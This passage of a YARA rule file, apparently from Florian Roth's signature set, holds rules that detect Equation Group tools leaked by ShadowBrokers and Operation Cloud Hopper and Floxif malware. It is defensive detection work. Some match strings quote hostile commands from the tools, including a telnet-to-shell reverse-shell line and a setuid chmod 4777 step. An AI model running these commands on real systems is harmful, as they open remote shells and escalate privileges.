      $x2 = "[-] kernel not vulnerable" fullword ascii
      $x3 = "[-] failed to spawn shell: %s" fullword ascii
      $x4 = "-s shell           Use shell instead of %s" fullword ascii
   condition: 
      1 of them
}

rule EquationGroup_cmsd_RID2E6A : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file cmsd"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 11:13:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "634c50614e1f5f132f49ae204c4a28f62a32a39a3446084db5b0b49b564034b8"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "usage: %s address [-t][-s|-c command] [-p port] [-v 5|6|7]" fullword ascii
      $x2 = "error: not vulnerable" fullword ascii
      $s1 = "port=%d connected! " fullword ascii
      $s2 = "xxx.XXXXXX" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 30KB and 1 of ( $x* ) ) or ( 2 of them )
}

rule EquationGroup_eggbasket_RID3070 : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file eggbasket"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:39:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "b078a02963610475217682e6e1d6ae0b30935273ed98743e47cc2553fbfd068f"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "# Building Shellcode into exploit." fullword ascii
      $x2 = "%s -w /index.html -v 3.5 -t 10 -c \"/usr/openwin/bin/xterm -d 555.1.2.2:0&\"  -d 10.0.0.1 -p 80" fullword ascii
      $x3 = "# STARTING EXHAUSTIVE ATTACK AGAINST " fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 90KB and 1 of them ) or ( 2 of them )
}

rule EquationGroup_jparsescan_RID30ED : APT DEMO G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file jparsescan"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 13:00:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "8c248eec0af04300f3ba0188fe757850d283de84cf42109638c1c1280c822984"
      tags = "APT, DEMO, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Usage:  $prog [-f directory] -p prognum [-V ver] [-t proto] -i IPadr" fullword ascii
      $s2 = "$gotsunos = ($line =~ /program version netid     address             service         owner/ );" fullword ascii
   condition: 
      ( filesize < 40KB and 1 of them )
}

rule EquationGroup_sambal_RID2F33 : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file sambal"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 11:47:01"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2abf4bbe4debd619b99cb944298f43312db0947217437e6b71b9ea6e9a1a4fec"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "+ Bruteforce mode." fullword ascii
      $s3 = "+ Host is not running samba!" fullword ascii
      $s4 = "+ connecting back to: [%d.%d.%d.%d:45295]" fullword ascii
      $s5 = "+ Exploit failed, try -b to bruteforce." fullword ascii
      $s7 = "Usage: %s [-bBcCdfprsStv] [host]" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 90KB and 1 of them ) or ( 2 of them )
}

rule EquationGroup_pclean_v2_1_1_2_RID31EE : APT DEMO FILE G0020 LINUX {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file pclean.v2.1.1.0-linux-i386"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 13:43:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "cdb5b1173e6eb32b5ea494c38764b9975ddfe83aa09ba0634c4bafa41d844c97"
      tags = "APT, DEMO, FILE, G0020, LINUX"
      minimum_yara = "3.5.0"
      
   strings:
      $s3 = "** SIGNIFICANTLY IMPROVE PROCESSING TIME" fullword ascii
      $s6 = "-c cmd_name:     strncmp() search for 1st %d chars of commands that " fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 40KB and all of them )
}

rule EquationGroup_cmsex_RID2EE3 : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file cmsex"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 11:33:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2d8ae842e7b16172599f061b5b1f223386684a7482e87feeb47a38a3f011b810"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Usage: %s -i <ip_addr/hostname> -c <command> -T <target_type> (-u <port> | -t <port>) " fullword ascii
      $x2 = "-i target ip address / hostname " fullword ascii
      $x3 = "Note: Choosing the correct target type is a bit of guesswork." fullword ascii
      $x4 = "Solaris rpc.cmsd remote root exploit" fullword ascii
      $x5 = "If one choice fails, you may want to try another." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 50KB and 1 of ( $x* ) ) or ( 2 of them )
}

rule EquationGroup_exze_RID2E7F : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file exze"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 11:17:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "1af6dde6d956db26c8072bf5ff26759f1a7fa792dd1c3498ba1af06426664876"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "shellFile" fullword ascii
      $s2 = "completed.1" fullword ascii
      $s3 = "zeke_remove" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 80KB and all of them )
}

rule EquationGroup_DUL_RID2DA8 : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file DUL"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 10:41:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "24d1d50960d4ebf348b48b4db4a15e50f328ab2c0e24db805b106d527fc5fe8e"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "?Usage: %s <shellcode> <output_file>" fullword ascii
      $x2 = "Here is the decoder+(encoded-decoder)+payload" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 80KB and 1 of them ) or ( all of them )
}

rule EquationGroup_slugger2_RID2FEE : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file slugger2"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:18:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a6a9ab66d73e4b443a80a69ef55a64da7f0af08dfaa7e17eb19c327301a70bdf"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "usage: %s hostip port cmd [printer_name]" fullword ascii
      $x2 = "command must be less than 61 chars" fullword ascii
      $s1 = "__rw_read_waiting" ascii
      $s2 = "completed.1" fullword ascii
      $s3 = "__mutexkind" ascii
      $s4 = "__rw_pshared" ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 50KB and ( 4 of them and 1 of ( $x* ) ) ) or ( all of them )
}

rule EquationGroup_ebbisland_RID3067 : APT DEMO G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file ebbisland"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:38:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "eba07c98c7e960bb6c71dafde85f5da9f74fd61bc87793c87e04b1ae2d77e977"
      tags = "APT, DEMO, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Usage: %s [-V] -t <target_ip> -p port" fullword ascii
      $x2 = "error - shellcode not as expected - unable to fix up" fullword ascii
      $x3 = "WARNING - core wipe mode - this will leave a core file on target" fullword ascii
      $x4 = "[-C] wipe target core file (leaves less incriminating core on failed target)" fullword ascii
      $x5 = "-A <jumpAddr> (shellcode address)" fullword ascii
      $x6 = "*** Insane undocumented incremental port mode!!! ***" fullword ascii
   condition: 
      filesize < 250KB and 1 of them
}

rule EquationGroup_jackpop_RID2FAB : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file jackpop"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:07:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "0b208af860bb2c7ef6b1ae1fcef604c2c3d15fc558ad8ea241160bf4cbac1519"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "%x:%d  --> %x:%d %d bytes" fullword ascii
      $s1 = "client: can't bind to local address, are you root?" fullword ascii
      $s2 = "Unable to register port" fullword ascii
      $s3 = "Could not resolve destination" fullword ascii
      $s4 = "raw troubles" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 30KB and 3 of them ) or ( all of them )
}

rule EquationGroup_parsescan_RID3083 : APT DEMO G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file parsescan"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:43:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "942c12067b0afe9ebce50aa9dfdbf64e6ed0702d9a3a00d25b4fca62a38369ef"
      tags = "APT, DEMO, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$gotgs=1 if (($line =~ /Scan for (Sol|SNMP)\\s+version/) or" fullword ascii
      $s2 = "Usage:  $prog [-f file] -p prognum [-V ver] [-t proto] -i IPadr" fullword ascii
   condition: 
      filesize < 250KB and 1 of them
}

rule EquationGroup_jscan_RID2ED2 : APT DEMO G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file jscan"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 11:30:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "8075f56e44185e1be26b631a2bad89c5e4190c2bfc9fa56921ea3bbc51695dbe"
      tags = "APT, DEMO, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "$scanth = $scanth . \" -s \" . $scanthreads;" fullword ascii
      $s2 = "print \"java -jar jscanner.jar$scanth$list\\n\";" fullword ascii
   condition: 
      filesize < 250KB and 1 of them
}

rule EquationGroup_epoxyresin_v1_0_0_RID333D : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file epoxyresin.v1.0.0.1"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 14:39:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "eea8a6a674d5063d7d6fc9fe07060f35b16172de6d273748d70576b01bf01c73"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "[-] kernel not vulnerable" fullword ascii
      $s1 = ".tmp.%d.XXXXXX" fullword ascii
      $s2 = "[-] couldn't create temp file" fullword ascii
      $s3 = "/boot/System.map-%s" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 30KB and $x1 ) or ( all of them )
}

rule EquationGroup_envoytomato_RID3188 : APT DEMO G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file envoytomato"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 13:26:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9bd001057cc97b81fdf2450be7bf3b34f1941379e588a7173ab7fffca41d4ad5"
      tags = "APT, DEMO, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "[-] kernel not vulnerable" fullword ascii
      $s2 = "[-] failed to spawn shell" fullword ascii
   condition: 
      filesize < 250KB and 1 of them
}

rule EquationGroup_smash_RID2EDF : APT DEMO G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file smash"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 11:33:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "1dc94b46aaff06d65a3bf724c8701e5f095c1c9c131b65b2f667e11b1f0129a6"
      tags = "APT, DEMO, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "T=<target IP> [O=<port>] Y=<target type>" fullword ascii
      $x2 = "no command given!! bailing..." fullword ascii
      $x3 = "no port. assuming 22..." fullword ascii
   condition: 
      filesize < 250KB and 1 of them
}

rule EquationGroup_ratload_RID2FAA : APT DEMO G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file ratload"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:06:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "4a4a8f2f90529bee081ce2188131bac4e658a374a270007399f80af74c16f398"
      tags = "APT, DEMO, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "/tmp/ratload.tmp.sh" fullword ascii
      $x2 = "Remote Usage: /bin/telnet locip locport < /dev/console | /bin/sh\"" fullword ascii
      $s6 = "uncompress -f ${NAME}.Z && PATH=. ${ARGS1} ${NAME} ${ARGS2} && rm -f ${NAME}" fullword ascii
   condition: 
      filesize < 250KB and 1 of them
}

rule EquationGroup_ys_RID2DAF : APT DEMO G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file ys.auto"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 10:42:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a6387307d64778f8d9cfc60382fdcf0627cde886e952b8d73cc61755ed9fde15"
      tags = "APT, DEMO, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "EXPLOIT_SCRIPME=\"$EXPLOIT_SCRIPME\"" fullword ascii
      $x3 = "DEFTARGET=`head /current/etc/opscript.txt 2>/dev/null | grepip 2>/dev/null | head -1`" fullword ascii
      $x4 = "FATAL ERROR: -x port and -n port MUST NOT BE THE SAME." fullword ascii
   condition: 
      filesize < 250KB and 1 of them
}

rule EquationGroup_ewok_RID2E79 : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file ewok"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 11:16:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "567da502d7709b7814ede9c7954ccc13d67fc573f3011db04cf212f8e8a95d72"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Example: ewok -t target public" fullword ascii
      $x2 = "Usage:  cleaner host community fake_prog" fullword ascii
      $x3 = "-g  - Subset of -m that Green Spirit hits " fullword ascii
      $x4 = "--- ewok version" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 80KB and 1 of them )
}

rule EquationGroup_xspy_RID2E97 : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file xspy"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 11:21:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "841e065c9c340a1e522b281a39753af8b6a3db5d9e7d8f3d69e02fdbd662f4cf"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "USAGE: xspy -display <display> -delay <usecs> -up" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 60KB and all of them )
}

rule EquationGroup_estesfox_RID3034 : APT DEMO G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file estesfox"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:29:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "33530cae130ee9d9deeee60df9292c00242c0fe6f7b8eedef8ed09881b7e1d5a"
      tags = "APT, DEMO, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "chown root:root x;chmod 4777 x`' /tmp/logwatch.$2/cron" fullword ascii
   condition: 
      all of them
}

rule EquationGroup_scanner_RID2FAD : APT DEMO G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file scanner"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:07:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "dcbcd8a98ec93a4e877507058aa26f0c865b35b46b8e6de809ed2c4b3db7e222"
      tags = "APT, DEMO, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "program version netid     address             service         owner" fullword ascii
      $x4 = "*** Sorry about the raw output, I'll leave it for now" fullword ascii
      $x5 = "-scan winn %s one" fullword ascii
   condition: 
      filesize < 250KB and 1 of them
}

rule EquationGroup__scanner_scanner_v2_1_2_RID357D : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files scanner, scanner.v2.1.2"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 16:15:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "dcbcd8a98ec93a4e877507058aa26f0c865b35b46b8e6de809ed2c4b3db7e222"
      hash2 = "9807aaa7208ed6c5da91c7c30ca13d58d16336ebf9753a5cea513bcb59de2cff"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Welcome to the network scanning tool" fullword ascii
      $s2 = "Scanning port %d" fullword ascii
      $s3 = "/current/down/cmdout/scans" fullword ascii
      $s4 = "Scan for SSH version" fullword ascii
      $s5 = "program vers proto   port  service" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 100KB and 2 of them ) or ( all of them )
}

rule EquationGroup__ghost_sparc_ghost_x86_3_RID361A : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files ghost_sparc, ghost_x86"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 16:41:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "d5ff0208d9532fc0c6716bd57297397c8151a01bf4f21311f24e7a72551f9bf1"
      hash2 = "82c899d1f05b50a85646a782cddb774d194ef85b74e1be642a8be2c7119f4e33"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Usage: %s [-v os] [-p] [-r] [-c command] [-a attacker] target" fullword ascii
      $x2 = "Sending shellcode as part of an open command..." fullword ascii
      $x3 = "cmdshellcode" fullword ascii
      $x4 = "You will not be able to run the shellcode. Exiting..." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 70KB and 1 of them ) or ( 2 of them )
}

rule EquationGroup__pclean_v2_1_1_pclean_v2_1_1_4_RID3748 : APT DEMO FILE G0020 LINUX {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files pclean.v2.1.1.0-linux-i386, pclean.v2.1.1.0-linux-x86_64"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 17:31:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "cdb5b1173e6eb32b5ea494c38764b9975ddfe83aa09ba0634c4bafa41d844c97"
      hash2 = "ab7f26faed8bc2341d0517d9cb2bbf41795f753cd21340887fc2803dc1b9a1dd"
      tags = "APT, DEMO, FILE, G0020, LINUX"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "-c cmd_name:     strncmp() search for 1st %d chars of commands that " fullword ascii
      $s2 = "e.g.: -n 1-1024,1080,6666,31337 " fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 50KB and all of them )
}

rule EquationGroup__jparsescan_parsescan_5_RID35FF : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files jparsescan, parsescan"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 16:37:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "8c248eec0af04300f3ba0188fe757850d283de84cf42109638c1c1280c822984"
      hash2 = "942c12067b0afe9ebce50aa9dfdbf64e6ed0702d9a3a00d25b4fca62a38369ef"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "# default is to dump out all scanned hosts found" fullword ascii
      $s2 = "$bool .= \" -r \" if (/mibiisa.* -r/);" fullword ascii
      $s3 = "sadmind is available on two ports, this also works)" fullword ascii
      $s4 = "-x IP      gives \\\"hostname:# users:load ...\\\" if positive xwin scan" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 40KB and 1 of them ) or ( 2 of them )
}

rule EquationGroup__funnelout_v4_1_0_1_RID33BA : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files funnelout.v4.1.0.1.pl"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 15:00:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash2 = "457ed14e806fdbda91c4237c8dc058c55e5678f1eecdd78572eff6ca0ed86d33"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "header(\"Set-Cookie: bbsessionhash=\" . \\$hash . \"; path=/; HttpOnly\");" fullword ascii
      $s2 = "if ($code =~ /proxyhost/) {" fullword ascii
      $s3 = "\\$rk[1] = \\$rk[1] - 1;" ascii
      $s4 = "#existsUser($u) or die \"User '$u' does not exist in database.\\n\";" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 100KB and 2 of them ) or ( all of them )
}

rule EquationGroup__magicjack_v1_1_0_0_client_RID364E : APT DEMO FILE G0020 SCRIPT {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files magicjack_v1.1.0.0_client-1.1.0.0.py"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 16:50:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "63292a2353275a3bae012717bb500d5169cd024064a1ce8355ecb4e9bfcdfdd1"
      tags = "APT, DEMO, FILE, G0020, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "temp = ((left >> 1) ^ right) & 0x55555555" fullword ascii
      $s2 = "right ^= (temp <<  16) & 0xffffffff" fullword ascii
      $s3 = "tempresult = \"\"" fullword ascii
      $s4 = "num = self.bytes2long(data)" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 80KB and 3 of them ) or ( all of them )
}

rule EquationGroup__ftshell_RID3014 : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- from files ftshell, ftshell.v3.10.3.7"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:24:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9bebeb57f1c9254cb49976cc194da4be85da4eb94475cb8d813821fb0b24f893"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "if { [string length $uRemoteUploadCommand]" fullword ascii
      $s2 = "processUpload" fullword ascii
      $s3 = "global dothisreallyquiet" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 100KB and 2 of them ) or ( all of them )
}

rule OpCloudHopper_WindowXarBot_RID315C : APT DEMO EXE FILE {
   meta:
      description = "Malware related to Operation Cloud Hopper"
      author = "Florian Roth"
      reference = "https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf"
      date = "2017-04-07 13:19:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "\\Release\\WindowXarbot.pdb" ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )
}

rule Malware_Floxif_mpsvc_dll_RID30C4 : DEMO EXE FILE HIGHVOL MAL {
   meta:
      description = "Malware - Floxif"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-04-07 12:53:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "1e654ee1c4736f4ccb8b5b7aa604782cfb584068df4d9e006de8009e60ab5a14"
      tags = "DEMO, EXE, FILE, HIGHVOL, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $op1 = { 04 80 7a 03 01 75 04 8d 42 04 c3 8d 42 04 53 8b } 
      $op2 = { 88 19 74 03 41 eb ea c6 42 03 01 5b c3 8b 4c 24 } 
      $op3 = { ff 03 8d 00 f9 ff ff 88 01 eb a1 } 
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )
}

rule OpCloudHopper_Malware_1_RID2FED : DEMO EXE FILE MAL {
   meta:
      description = "Detects Operation CloudHopper malware samples"
      author = "Florian Roth"
      reference = "https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html"
      date = "2017-04-03 12:18:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "27876dc5e6f746ff6003450eeea5e98de5d96cbcba9e4694dad94ca3e9fb1ddc"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "zok]\\\\\\ZZYYY666564444" fullword ascii
      $s2 = "z{[ZZYUKKKIIGGGGGGGGGGGGG" fullword ascii
      $s3 = "EEECEEC" fullword ascii
      $s4 = "IIEFEE" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )
}

rule OpCloudHopper_Malware_3_RID2FEF : DEMO EXE FILE MAL {
   meta:
      description = "Detects Operation CloudHopper malware samples"
      author = "Florian Roth"
      reference = "https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html"
      date = "2017-04-03 12:18:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "c21eaadf9ffc62ca4673e27e06c16447f103c0cf7acd8db6ac5c8bd17805e39d"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s6 = "operator \"\" " fullword ascii
